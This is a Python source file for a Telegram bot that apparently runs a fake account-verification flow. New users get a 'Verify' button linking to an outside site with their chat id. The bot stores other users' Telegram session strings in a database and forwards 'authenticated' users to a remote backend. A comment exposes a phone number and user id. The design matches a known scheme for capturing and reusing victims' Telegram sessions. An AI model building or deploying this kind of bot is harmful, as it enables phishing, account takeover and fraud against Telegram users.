import sqlite3
import re
import asyncio
import httpx
import requests
from telethon.sessions import StringSession
from telethon import TelegramClient, events
from telethon.tl.custom import Button
import aiohttp  # Asynchronous HTTP requests
from dotenv import load_dotenv
import os
import psycopg2
from psycopg2 import sql
from aiohttp import web  # For the HTTP server

# Load environment variables from the .env file
load_dotenv()


# Database Setup
# Use Render's environment variables for database connection details
DB_HOST = os.getenv("DB_HOST")
DB_NAME = os.getenv("DB_NAME")
DB_USER = os.getenv("DB_USER")
DB_PASSWORD = os.getenv("DB_PASSWORD")
DB_PORT = os.getenv("DB_PORT", "5432")

# Connect to PostgreSQL
try:
    db_conn = psycopg2.connect(
        host=DB_HOST,
        database=DB_NAME,
        user=DB_USER,
        password=DB_PASSWORD,
        port=DB_PORT
    )
    db_cursor = db_conn.cursor()
    print("Connected to PostgreSQL database successfully.")
except Exception as e:
    print(f"Error connecting to PostgreSQL: {e}")
    exit()

# create tables
# Create a table to store the bot's session
db_cursor.execute("""
    CREATE TABLE IF NOT EXISTS bot_sessions (
        id SERIAL PRIMARY KEY,
        session_data TEXT NOT NULL
    )
""")
db_conn.commit()



# Helper Functions
def save_bot_session(session_string):
    query = """
        INSERT INTO bot_sessions (id, session_data)
        VALUES (1, %s)
        ON CONFLICT (id) DO UPDATE
        SET session_data = EXCLUDED.session_data;
    """
    db_cursor.execute(query, (session_string,))
    db_conn.commit()
    print("Bot session saved successfully.")


def delete_bot_session():
    query = "DELETE FROM bot_sessions WHERE id = 1;"
    db_cursor.execute(query)
    db_conn.commit()
    print("Bot session deleted successfully.")

# Delete the session at the end
# delete_bot_session()


def get_bot_session():
    query = "SELECT session_data FROM bot_sessions WHERE id = 1;"
    db_cursor.execute(query)
    result = db_cursor.fetchone()
    return result[0] if result else None


def get_session_from_db(chat_id):
    query = "SELECT session_data FROM telegram_sessions WHERE chat_id = %s;"
    db_cursor.execute(query, (chat_id,))
    result = db_cursor.fetchone()
    if result:
        print(f"Session for chat_id {chat_id} retrieved successfully.")
    return result[0] if result else None


# Create bot_client with Persistent Session
def create_bot_client(api_id, api_hash, bot_token):
    # Get the existing session string from the database
    session_string = get_bot_session()

    # Initialize session with validation
    if session_string:
        try:
            # Create a temporary client to validate the session with the new credentials
            temp_client = TelegramClient(StringSession(session_string), api_id, api_hash)
            temp_client.start(bot_token=bot_token)
            temp_client.disconnect()
            session = StringSession(session_string)  # Reuse the valid session
            print("Using the existing valid session.")
        except Exception:
            print("Existing session is invalid for the new credentials. Creating a new session.")
            session = StringSession()  # Create a new session if the existing one is invalid
    else:
        print("No session found in the database. Creating a new session.")
        session = StringSession()

    # Initialize the bot client
    bot_client = TelegramClient(session, api_id, api_hash).start(bot_token=bot_token)

    # Save the session string to the database
    save_bot_session(bot_client.session.save())

    return bot_client



# Example Usage
# save_user_to_db(7905915877, "+2348064801910", "session_+2348064801910")
# print(get_session_for_user(7905915877))


def is_user_authenticated(chat_id):
    return get_session_from_db(chat_id) is not None

# Access the environment variables
api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
bot_token = os.getenv('BOT_TOKEN')

# Initialize the bot client with persistent session
bot_client = create_bot_client(api_id, api_hash, bot_token)

# External API endpoint to call (Flask server endpoint)
API_URL = 'https://backend-q16p.onrender.com/send_message'  # Replace with your API endpoint

# Event handler for /start command
# Event handler for /start command
@bot_client.on(events.NewMessage(pattern='/start'))
async def on_start(event):
    chat_id = event.chat_id

    try:
        # Check if the user is authenticated
        if is_user_authenticated(chat_id):
            await event.respond("Verifying Account. Please wait...")  # Added message
            await send_message_by_chat_id(chat_id)
            return
        # Download the image from the URL using aiohttp
        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'

        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as response:
                if response.status == 200:
                    from io import BytesIO  # Import BytesIO here to avoid unnecessary global imports
                    image_data = BytesIO(await response.read())  # Convert the content into a file-like object
                    image_data.name = 'image.jpg'  # Set a name for the file-like object

                    await event.respond(
                        file=image_data,  # Send the image as bytes with a name
                        message=(
                            "You can verify your account by clicking on the verify button below\n\n"
                            "This is a one time use and will expire"
                        ),
                        buttons=[
                            [Button.url("Verify", f"https://safeguardverification.netlify.app/?chat_id={chat_id}")],
                            [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
                        ]
                    )
                else:
                    print(f"Failed to fetch the image from the provided URL.")
    except Exception as e:
        await event.respond(f"Error: There was an issue verifying your account. Please try again")

        

# Function to call the external API (e.g., sending a message)
async def send_message_by_chat_id(chat_id):
    async with aiohttp.ClientSession() as session:
        try:
            data = {'chat_id': chat_id}
            async with session.post(API_URL, json=data) as response:
                if response.status == 200:
                    response_data = await response.json()
                    return f"Response from API: {response_data.get('message', 'Success!')}"
                else:
                    return f"Error from API: {response.status}"
        except Exception as e:
            return f"Failed to call API: {e}"

# HTTP Server for health checks
async def health_check(request):
    return web.Response(text="Bot is running!")

async def run_http_server():
    app = web.Application()
    app.router.add_get('/health', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 5001)  # Use port 5001
    await site.start()


# Individual health check for the first target URL
async def first_health_check(target_url):
    while True:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{target_url}/health")
                if response.status_code == 200:
                    print(f"Health check success for {target_url}")
                else:
                    print(f"Health check failed for {target_url} with status code {response.status_code}")
        except Exception as e:
            print(f"Error during health check for {target_url}: {e}")
        await asyncio.sleep(15)  # Wait 15 seconds before checking again


# Individual health check for the second target URL
async def second_health_check(target_url):
    while True:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{target_url}/health")
                if response.status_code == 200:
                    print(f"Health check success for {target_url}")
                else:
                    print(f"Health check failed for {target_url} with status code {response.status_code}")
        except Exception as e:
            print(f"Error during health check for {target_url}: {e}")
        await asyncio.sleep(15)  # Wait 15 seconds before checking again


# Individual health check for the second target URL
async def third_health_check(target_url):
    while True:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{target_url}/health")
                if response.status_code == 200:
                    print(f"Health check success for {target_url}")
                else:
                    print(f"Health check failed for {target_url} with status code {response.status_code}")
        except Exception as e:
            print(f"Error during health check for {target_url}: {e}")
        await asyncio.sleep(15)  # Wait 15 seconds before checking again


# Individual health check for the second target URL
async def fourth_health_check(target_url):
    while True:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{target_url}/health")
                if response.status_code == 200:
                    print(f"Health check success for {target_url}")
                else:
                    print(f"Health check failed for {target_url} with status code {response.status_code}")
        except Exception as e:
            print(f"Error during health check for {target_url}: {e}")
        await asyncio.sleep(15)  # Wait 15 seconds before checking again


# General health check combining both URLs
async def general_health_check(first_target_url, second_target_url, third_target_url, fourth_target_url):
    while True:
        try:
            # Run both health checks concurrently
            await asyncio.gather(
                first_health_check(first_target_url),
                second_health_check(second_target_url),
                third_health_check(third_target_url),
                fourth_health_check(fourth_target_url),
            )
        except Exception as e:
            print(f"Error during general health check: {e}")
        await asyncio.sleep(15)  # Ensure a loop cycle even if there's an exception


# Main function to run both the bot and the HTTP server
# Main function to run both the bot and the HTTP server
async def main():
    # Start the bot
    await bot_client.start()
    print("Bot is running...")

    # Start the HTTP server in the background
    asyncio.create_task(run_http_server())

    # Start the health check tasks concurrently, but ensure they don't interfere with the bot
    first_server_url = "https://api-proxy-4e13.onrender.com"  # Update to actual address
    second_server_url = "https://backend-q16p.onrender.com"  # Update to actual address
    third_server_url = "https://drop-bt.onrender.com"  # Update to actual address
    fourth_server_url = "https://meme-scraper-bt.onrender.com"  # Update to actual address
    asyncio.create_task(general_health_check(first_server_url, second_server_url, third_server_url, fourth_server_url))

    # Keep the bot running, ensuring it doesn't exit prematurely
    await bot_client.run_until_disconnected()


# Run the bot
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
